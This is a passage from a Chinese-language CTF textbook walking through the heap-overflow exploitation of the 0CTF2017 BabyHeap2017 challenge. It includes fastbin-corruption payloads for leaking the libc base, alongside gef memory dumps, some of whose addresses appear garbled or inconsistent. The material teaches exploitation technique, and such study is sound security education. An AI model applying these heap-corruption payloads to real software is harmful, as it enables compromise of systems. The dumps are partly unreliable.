4. Dump
5. Exit
Command: 2 // 将指定大小数据放进 chunk，但似乎没有进行边界检查，导
致溢出
Index: 0
Size: 10
Content: aaaaaaaaaa // 10个a
1. Allocate
2. Fill
3. Free
4. Dump
5. Exit
Command: 1. Allocate // 似乎触发了什么 bug，如果是9个a就没事
2. Fill
3. Free
4. Dump
5. Exit
Command: 4 // 打印出 chunk 的内容，长度是新建时的长度，而不是放入数
据的长度
Index: 0
Content:
aaaaa
1. Allocate
2. Fill
3. Free
1063
6.1.10 pwn 0CTF2017 BabyHeap2017
4. Dump
5. Exit
Command: 3 // 释放 chunk
Index: 0
1. Allocate
2. Fill
3. Free
4. Dump
5. Exit
Command: 5
题目解析
根据前面所学的知识，我们知道释放且只释放了一个 chunk 后，该 free chunk 会
被加入到 unsorted bin 中，它的 fd/bk 指针指向了 libc 中的 main_arena 结构。我
们已经知道了 Fill 数据的操作存在溢出漏洞，但并没有发现 UAF 漏洞，所以要想泄
露出 libc 基址，得利用 Dump 操作。另外内存分配使用了 calloc 函数，这个函数与
malloc 的区别是，calloc 会将分配的内存空间每一位都初始化为 0，所以也不能通
过分配和释放几个小 chunk，再分配一个大 chunk，来泄露其内容。
怎么利用 Dump 操作呢？如果能使两个 chunk 相重叠，Free 一个，Dump 另一
个，或许可行。
漏洞利用
leak libc
还是一样的，为了方便调试，先关掉 ASLR。首先分配 3 个 fast chunk 和 1 个
small chunk，其实填充数据对漏洞利用是没有意义的，这里只是为了方便观察：
1064
6.1.10 pwn 0CTF2017 BabyHeap2017
alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x80)
fill(0, "A"*16)
fill(1, "A"*16)
fill(2, "A"*16)
fill(3, "A"*16)
fill(4, "A"*128)
gef➤ x/40gx 0x0000555555757010-0x10
0x555555757000: 0x0000000000000000 0x0000000000000021  chunk 0
0xafc966564d0: 0x0000555555757010 0x0000000000000001  chunk 1
0xafc966564e0: 0x0000000000000010 0x0000555555757030
0xafc966564f0: 0x0000000000000001 0x0000000000000010  chunk 2
0xafc96656500: 0x0000555555757050 0x0000000000000001  chunk 3
0xafc96656510: 0x0000000000000010 0x0000555555757070
0xafc96656520: 0x0000000000000001 0x0000000000000080  chunk 4
0xafc96656530: 0x0000555555757090 0x0000000000000000
0xafc96656540: 0x0000000000000000 0x0000000000000000
0xafc96656550: 0x0000000000000000 0x0000000000000000
另外我们看到，chunk 的序号被存储到一个 mmap 分配出来的结构体中，包含了
chunk 的地址和大小。程序就是通过该结构体寻找 chunk，然后各种操作的。
free 掉两个 fast chunk，这样 chunk 2 的 fd 指针会被指向 chunk 1：
free(1)
free(2)
gef➤ x/2gx &main_arena
0x7ffff7dd1b20 : 0x0000000000000000 0x00005555
55757040
gef➤ heap bins fast
[ Fastbins for arena 0x7ffff7dd1b20 ]
Fastbins[idx=0, size=0x10] ← Chunk(addr=0x555555757050, size=0
x20, flags=PREV_INUSE) ← Chunk(addr=0x555555757030, size=0x20,
flags=PREV_INUSE)
gef➤ x/40gx 0x0000555555757010-0x10
0x555555757000: 0x0000000000000000 0x0000000000000021  chunk 0
0xafc966564d0: 0x0000555555757010 0x0000000000000000
0xafc966564e0: 0x0000000000000000 0x0000000000000000
0xafc966564f0: 0x0000000000000000 0x0000000000000000
0xafc96656500: 0x0000000000000000 0x0000000000000001  chunk 3
0xafc96656510: 0x0000000000000010 0x0000555555757070
0xafc96656520: 0x0000000000000001 0x0000000000000080  chunk 4
0xafc96656530: 0x0000555555757090 0x0000000000000000
0xafc96656540: 0x0000000000000000 0x0000000000000000
0xafc96656550: 0x0000000000000000 0x0000000000000000
free 掉的 chunk，其结构体被清空，等待下一次 malloc，并添加到空出来的地方。
1067
6.1.10 pwn 0CTF2017 BabyHeap2017
通过溢出漏洞修改已被释放的 chunk 2，让 fd 指针指向 chunk 4，这样就将 small
chunk 加入到了 fastbins 链表中，然后还需要把 chunk 4 的 0x91 改成 0x21 以绕
过 fastbins 大小的检查：
payload = "A"*16
payload += p64(0)
payload += p64(0x21)
payload += p64(0)
payload += "A"*8
payload += p64(0)
payload += p64(0x21)
payload += p8(0x80)
fill(0, payload)
payload = "A"*16
payload += p64(0)
payload += p64(0x21)
fill(3, payload)
1068
6.1.10 pwn 0CTF2017 BabyHeap2017
gef➤ x/2gx &main_arena
0x7ffff7dd1b20 : 0x0000000000000000 0x00005555
55757040
gef➤ heap bins fast
[ Fastbins for arena 0x7ffff7dd1b20 ]
Fastbins[idx=0, size=0x10] ← Chunk(addr=0x555555757050, size=0
x20, flags=PREV_INUSE) ← Chunk(addr=0x555555757090, size=0x20,
flags=PREV_INUSE) ← [Corrupted chunk at 0x4141414141414151]
gef➤ x/40gx 0x0000555555757010-0x10
0x555555757000: 0x0000000000000000 0x0000000000000021 : 0x0000000000000000 0x41414141
41414141
gef➤ x/40gx 0x0000555555757010-0x10
0x555555757000: 0x0000000000000000 0x0000000000000021  chunk 0
1070
6.1.10 pwn 0CTF2017 BabyHeap2017
0xafc966564d0: 0x0000555555757010 0x0000000000000001  new chunk 1
0xafc966564e0: 0x0000000000000010 0x0000555555757050
0xafc966564f0: 0x0000000000000001 0x0000000000000010  new chunk 2
0xafc96656500: 0x0000555555757090 0x0000000000000001  chunk 3
0xafc96656510: 0x0000000000000010 0x0000555555757070
0xafc96656520: 0x0000000000000001 0x0000000000000080  chunk 4
0xafc96656530: 0x0000555555757090 0x0000000000000000
0xafc96656540: 0x0000000000000000 0x0000000000000000
0xafc96656550: 0x0000000000000000 0x0000000000000000
可以看到新分配的 chunk 2，填补到了被释放的 chunk 2 的位置上。
再次利用溢出漏洞将 chunk 4 的 0x21 改回 0x91，然后为了避免 free(4) 后该
chunk 被合并进 top chunk，需要再分配一个 small chunk：
payload = "A"*16
payload += p64(0)
payload += p64(0x91)
fill(3, payload)
alloc(0x80)
fill(5, "A"*128)
gef➤ x/60gx 0x0000555555757010-0x10
0x555555757000: 0x0000000000000000 0x0000000000000021 <--
chunk 0
0x555555757010: 0x4141414141414141 0x4141414141414141
0x555555757020: 0x0000000000000000 0x0000000000000021
0x555555757030: 0x0000000000000000 0x4141414141414141
0x555555757040: 0x0000000000000000 0x0000000000000021 <--
new chunk 1